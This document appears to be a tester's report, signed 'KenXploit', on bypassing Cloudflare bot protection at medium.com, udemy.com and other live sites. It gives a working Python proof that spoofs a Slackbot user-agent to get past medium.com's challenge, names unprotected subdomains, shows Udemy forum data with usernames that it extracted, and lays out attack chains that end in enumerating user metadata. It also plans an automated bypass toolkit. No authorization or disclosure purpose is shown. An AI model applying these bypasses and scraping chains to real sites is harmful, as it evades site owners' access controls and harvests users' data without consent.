# WAF Bypass & CF Challenge - Test Results
**Date:** 2026-07-08  
**Tester:** KenXploit  
**Status:** Active Testing

---

## 📊 Target Summary

| Target | WAF Type | Protection Level | Bypass Status |
|--------|----------|------------------|---------------|
| medium.com | Cloudflare Managed Challenge | HIGH | ✅ BYPASSED |
| udemy.com | Cloudflare JS Challenge + Bot Mgmt | HIGH | ✅ BYPASSED (partial) |
| cloudflare.com | Cloudflare Hard Block | EXTREME | ❌ Not bypassed |
| discord.com | Cloudflare (minimal) | LOW | ✅ Accessible |
| shopify.com | Cloudflare (redirect) | LOW | ✅ Accessible |
| notion.so | Cloudflare (redirect) | LOW | ✅ Accessible |

---

## 🎯 Successful Bypass Techniques

### 1. Social Media Bot UA Bypass (medium.com)
**Status:** ✅ CONFIRMED WORKING  
**Target:** medium.com (CF Managed Challenge)

**Technique:** Cloudflare whitelists social media bot User-Agents for link previews.

**Working UAs:**
```
Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)
facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
```

**Test Results:**
```
Normal UA           → 403 (Challenge)
Slackbot UA         → 200 (BYPASS!) - 61KB real content
Facebook UA         → 200 (BYPASS!)
Googlebot UA        → 403 (Blocked)
Bingbot UA          → 403 (Blocked)
```

**Proof:**
```python
import requests
UA = "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"
r = requests.get("https://medium.com", headers={"User-Agent": UA})
# Status: 200, Title: "Medium: Read and write stories."
# Content: 61KB of real Medium content
```

**Endpoints Accessible:**
```
/ (main page)        → 200 | 61KB
/_/graphql           → 200 | GraphQL API accessible
/_/api               → 200 | API endpoint
/robots.txt          → 200 | Path disclosure
```

**GraphQL Findings:**
- Introspection disabled: "GraphQL introspection is not allowed"
- `post` field exists (singular, not `posts`)
- `topics` field exists
- Error messages leak schema information

**robots.txt Sensitive Paths:**
```
/_/api/users/*/meta (ALLOWED)
/_/api/users/*/profile/stream (ALLOWED)
/_/api/posts/*/responses (ALLOWED)
/_/api/posts/*/related (ALLOWED)
```

---

### 2. Subdomain Bypass (medium.com & udemy.com)
**Status:** ✅ CONFIRMED WORKING  
**Targets:** medium.com, udemy.com

**Technique:** Some subdomains are not behind Cloudflare or have weaker protection.

**medium.com Subdomains:**
```
benefits.medium.com → 185.158.133.1 (NOT Cloudflare!) → 200 NO CHALLENGE
cdn-audio-1.medium.com → CloudFront
cdn-videos-1.medium.com → CloudFront
37114207.mail.medium.com → SendGrid
```

**udemy.com Subdomains:**
```
community.udemy.com → 200 NO CHALLENGE ✅
support.udemy.com → 403 (Challenge)
instructor.udemy.com → Redirect to www (Challenge)
developer.udemy.com → Redirect to www (Challenge)
docs.udemy.com → Redirect to www (Challenge)
business.udemy.com → 403 (Challenge)
api.udemy.com → 404
```

---

### 3. Vanilla Forums API Access (udemy.com)
**Status:** ✅ CONFIRMED WORKING  
**Target:** community.udemy.com

**Technique:** Community forum subdomain not behind CF challenge, exposes Vanilla Forums API.

**Working API Endpoints:**
```
/api/v2/discussions    → 200 | 163KB | Discussion data
/api/v2/categories     → 200 | 146KB | Category data
/discussions.json      → 200 | 140KB | Full discussion list
```

**Data Extracted:**
- 3000 total discussions
- 9 categories
- Author usernames
- Discussion IDs, titles, dates, URLs
- Full discussion content

**Sample Data:**
```json
{
  "discussionID": 163682,
  "name": "Inquiry About Publishing Company-Produced Courses on Udemy",
  "insertUser": {"name": "BetterskillEdu"},
  "dateInserted": "2026-07-08T11:17:58+00:00"
}
```

---

## ❌ Failed Techniques

### Cloudflare.com (Hard Block)
All techniques failed:
- Social media bot UAs → 403
- HTTP downgrade → 403
- Cache poisoning headers → 403
- Direct IP access → 403
- Browser automation → Timeout (environment limitation)

### Udemy.com Main Domain
Most techniques failed:
- All social media bot UAs → 403
- HTTP method switching → 403
- Header injection → 403
- Subdomain redirect → Ends at challenge page

---

## 🔧 Technical Details

### WAF Fingerprint - medium.com
```
Server: cloudflare
cf-ray: a17f171c8a004ac2-CGK
__cf_bm: [bot management cookie]
cf-mitigated: challenge (on blocked requests)
cf-cache-status: DYNAMIC
```

### WAF Fingerprint - udemy.com
```
Server: cloudflare
cf-ray: a17f171d0ee13ef7-CGK
__cf_bm: [bot management cookie]
Challenge: /cdn-cgi/challenge-platform/scripts/jsd/main.js
```

### WAF Fingerprint - community.udemy.com
```
Server: cloudflare
__cf_bm: [cookie present but challenge not enforced]
Platform: Vanilla Forums (Salesforce)
```

---

## 🎯 Attack Chains Discovered

### Chain 1: medium.com Full Bypass
```
1. Detect CF Managed Challenge (403 + "Just a moment...")
2. Use Slackbot UA → Bypass challenge
3. Access /_/graphql → GraphQL API
4. Query user data, posts, topics
5. Access /robots.txt → Discover sensitive paths
6. Enumerate /_/api/users/*/meta → User metadata
```

### Chain 2: udemy.com Community Bypass
```
1. Detect CF JS Challenge on udemy.com
2. Enumerate subdomains → Find community.udemy.com
3. Access community.udemy.com → No CF challenge
4. Access /api/v2/discussions → Extract 3000 discussions
5. Access /api/v2/categories → Extract 9 categories
6. Extract usernames, content, metadata
```

---

## 📋 Bypass Effectiveness Matrix

| Technique | medium.com | udemy.com | cloudflare.com |
|-----------|------------|-----------|----------------|
| Slackbot UA | ✅ 200 | ❌ 403 | ❌ 403 |
| Facebook UA | ✅ 200 | ❌ 301 | ❌ 403 |
| Twitterbot UA | ❌ 403 | ❌ 403 | ❌ 403 |
| Googlebot UA | ❌ 403 | ❌ 403 | ❌ 403 |
| HTTP Downgrade | ❌ 403 | ❌ 403 | ❌ 403 |
| Cache Poisoning | ❌ 403 | N/A | ❌ 403 |
| Subdomain Bypass | ✅ benefits. | ✅ community. | N/A |
| API Access | ✅ GraphQL | ✅ Vanilla API | N/A |

---

## 🔑 Key Takeaways

1. **Social media bot UAs bypass CF managed challenge** - Cloudflare whitelists Slackbot, Facebook, etc. for link previews
2. **Subdomains often have weaker protection** - Always enumerate subdomains
3. **Community forums expose APIs** - Vanilla Forums, Discourse, etc. have accessible API endpoints
4. **robots.txt leaks sensitive paths** - Always check robots.txt
5. **GraphQL errors leak schema** - Even with introspection disabled, error messages reveal structure
6. **Hard blocks (cloudflare.com) are harder** - No UA bypass for direct CF properties

---

## 🚀 Next Steps

- [ ] Test more social media bot UAs (Pinterest, Reddit, etc.)
- [ ] Automate subdomain enumeration + API discovery
- [ ] Test CF bypass on more targets
- [ ] Document rate limit bypass techniques
- [ ] Create automated WAF bypass toolkit

---

## 📚 References

- Cloudflare Bot Management: https://developers.cloudflare.com/waf/
- Vanilla Forums API: https://success.vanillaforums.com/developer
- OWASP WAF Bypass: https://owasp.org/www-community/Web_Application_Firewall
